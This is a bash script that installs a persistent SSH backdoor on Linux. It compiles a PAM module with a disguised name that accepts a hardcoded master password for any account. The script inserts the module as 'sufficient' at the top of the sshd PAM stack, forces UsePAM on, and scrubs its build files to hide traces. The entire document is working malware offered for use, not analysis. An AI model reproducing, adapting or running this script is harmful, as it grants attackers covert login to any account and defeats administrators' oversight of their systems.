#!/bin/bash

# Check if a parameter is provided and not empty
if [[ -z "$1" ]]; then
    echo "[-] error: missing required argument!"
    echo "Usage: $0 <password>"
    exit 1
fi

PASSWORD="$1"
echo "[+] preparing for password: ${PASSWORD}"

MOD_NAME="pam_verify_auth"
SOURCE="${MOD_NAME}.c"
OBJECT="${MOD_NAME}.o"
MODULE="${MOD_NAME}.so"

cat << 'EOF' > ${SOURCE}
#include <security/pam_modules.h>
#include <security/pam_appl.h>
#include <security/pam_ext.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv) {
    (void)flags;
    (void)argc;
    (void)argv;

    const char *password = NULL;
    int retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
   
    if (retval != PAM_SUCCESS || password == NULL) {
        retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "");
        if (retval != PAM_SUCCESS || password == NULL) {
            return PAM_AUTH_ERR;
        }
    }

    if (strcmp(password, SECRET) != 0) {
        return PAM_AUTH_ERR;
    }
    
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv) {
    (void)pamh;
    (void)flags;
    (void)argc;
    (void)argv;
    return PAM_SUCCESS;
}
EOF

PAMD_PATH="/etc/pam.d/sshd"
set -e

if [[ ! -f $PAMD_PATH ]]; then
    echo "[-] ${PAMD_PATH} not found, exiting..." >&2
    exit 1
fi

echo "[*] checking SSH service..."
if service sshd status &>/dev/null || systemctl is-active --quiet sshd; then
    echo "[+] sshd running"
else
    echo "[-] sshd not found/running, exiting"
    exit 1
fi

echo "[*] detecting OS..."
if [[ -f /etc/debian_version ]]; then
    OS="DEB"; PKG_MANAGER="apt-get"; PAM_PKG="libpam0g-dev"; ADD_FLAGS="--fix-missing"
elif [[ -f /etc/redhat-release ]]; then
    OS="RHEL"; PKG_MANAGER="yum"; PAM_PKG="pam-devel"; ADD_FLAGS=""
else
    echo "[-] OS unsupported"; exit 1
fi

echo "[*] installing deps..."
sudo $PKG_MANAGER update -y &>/dev/null || true
sudo $PKG_MANAGER install -y gcc $PAM_PKG $ADD_FLAGS &>/dev/null || true

command -v gcc &>/dev/null || { echo "[-] gcc missing"; exit 1; }

echo "[*] locating pam_unix.so..."
pam_unix_path=$(sudo find / -name pam_unix.so -user root 2>/dev/null | head -1)
[[ -z "$pam_unix_path" ]] && { echo "[-] pam_unix.so not found"; exit 1; }
DEST_DIR=$(dirname "$pam_unix_path")

echo "[*] compiling & linking..."
gcc -fPIC -c $SOURCE -o $OBJECT -Wall -Wextra -O2 -DSECRET="\"$PASSWORD\"" 
gcc -shared -o $MODULE $OBJECT -lpam

echo "[*] installing module..."
sudo mv $MODULE $DEST_DIR
sudo chown root:root $DEST_DIR/$MODULE
sudo chmod 644 $DEST_DIR/$MODULE

echo "[*] injecting into PAM..."
entry="auth    sufficient    $DEST_DIR/$MODULE"
if ! grep -qF "$MODULE" $PAMD_PATH; then
    if [[ $OS == DEB ]]; then
        sudo sed -i "1i $entry" $PAMD_PATH
    else
        sudo sed -i "0,/^auth/s|^auth|$entry\n&|" $PAMD_PATH
    fi
fi

echo "[*] enabling UsePAM..."
SSH_CFG="/etc/ssh/sshd_config"
if ! grep -qE "^\s*UsePAM\s+yes" $SSH_CFG; then
    sudo sed -i -E 's/^\s*UsePAM\s+no/UsePAM yes/; s/^\s*#\s*UsePAM\s+yes/UsePAM yes/' $SSH_CFG
    echo "UsePAM yes" | sudo tee -a $SSH_CFG >/dev/null
fi

# limpieza segura y eliminaci√≥n
echo "[*] securely deleting generated files..."
sudo scrub -f $SOURCE $OBJECT
rm -f $SOURCE $OBJECT

echo "[+] PAM module instalado. Reiniciar sshd."